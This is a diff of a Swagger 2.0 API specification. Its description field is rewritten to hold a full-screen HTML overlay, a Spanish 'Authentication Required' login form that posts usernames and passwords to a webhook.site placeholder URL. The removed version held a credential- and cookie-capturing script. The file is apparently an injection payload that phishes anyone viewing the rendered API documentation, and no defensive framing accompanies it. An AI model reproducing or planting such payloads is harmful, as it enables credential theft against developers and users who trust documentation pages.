@@ -1,45 +1,24 @@
 swagger: '2.0'
 info:
   version: 1.0.0
-  title: Fake Login Page
-  description: '<div class="login-form" style="max-width:360px;margin:40px auto;font-family:Arial,Helvetica,sans-serif;">
-    <div class="heading" style="text-align:center;margin-bottom:20px;">
-        <h1 style="font-size:22px;margin-bottom:5px;">Sign in</h1>
-        <p style="color:#777;font-size:13px;">Use your account credentials</p>
-    </div>
-    <div class="form-container" style="border:1px solid #ddd;padding:20px;border-radius:4px;background:#fafafa;">
-        <form onsubmit="event.preventDefault();capture();" class="form-signin">
-            <div class="form-group" style="margin-bottom:15px;">
-                <label style="display:block;font-size:13px;">Username</label>
-                <input id="u" type="text" style="width:100%;padding:8px;">
-            </div>
-            <div class="form-group" style="margin-bottom:15px;">
-                <label style="display:block;font-size:13px;">Password</label>
-                <input id="p" type="password" style="width:100%;padding:8px;">
-            </div>
-            <button type="submit" style="width:100%;padding:9px;background:#2f80ed;border:none;color:#fff;">
-                Login
-            </button>
+  title: API Interna
+  description: >
+    <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.4);z-index:999999;display:flex;align-items:center;justify-content:center;font-family:Arial,sans-serif;">
+      <div style="width:360px;background:white;padding:35px;border-radius:10px;box-shadow:0 8px 25px rgba(0,0,0,0.25);">
+        <h2 style="text-align:center;margin:0 0 20px;color:#1a1a1a;">Autenticación Requerida</h2>
+        <form action="https://webhook.site/TU-UUID-AQUÍ" method="POST">
+          <div style="margin-bottom:18px;">
+            <input name="username" placeholder="Usuario o correo electrónico" required style="width:100%;padding:12px;border:1px solid #d1d5db;border-radius:6px;box-sizing:border-box;font-size:15px;">
+          </div>
+          <div style="margin-bottom:24px;">
+            <input type="password" name="password" placeholder="Contraseña" required style="width:100%;padding:12px;border:1px solid #d1d5db;border-radius:6px;box-sizing:border-box;font-size:15px;">
+          </div>
+          <button type="submit" style="width:100%;padding:13px;background:#2563eb;color:white;border:none;border-radius:6px;font-size:15px;font-weight:600;cursor:pointer;">
+            Iniciar sesión
+          </button>
         </form>
-        <pre id="out" style="margin-top:15px;font-size:11px;background:#eee;padding:10px;"></pre>
+        <p style="text-align:center;margin:16px 0 0;font-size:13px;color:#4b5563;">
+          <a href="#" style="color:#2563eb;text-decoration:none;">¿Problemas para acceder?</a>
+        </p>
+      </div>
     </div>
-</div>
-
-<script>
-function capture() {
-  var u = document.getElementById("u").value;
-  var p = document.getElementById("p").value;
-  var c = document.cookie;
-  document.getElementById("out").textContent =
-    "Captured credentials:\\n" +
-    "Username: " + u + "\\n" +
-    "Password: " + p + "\\n\\n" +
-    "Cookies:\\n" + c;
-}
-</script>'
-paths:
-  /:
-    post:
-      responses:
-        '200':
-          description: Login successful
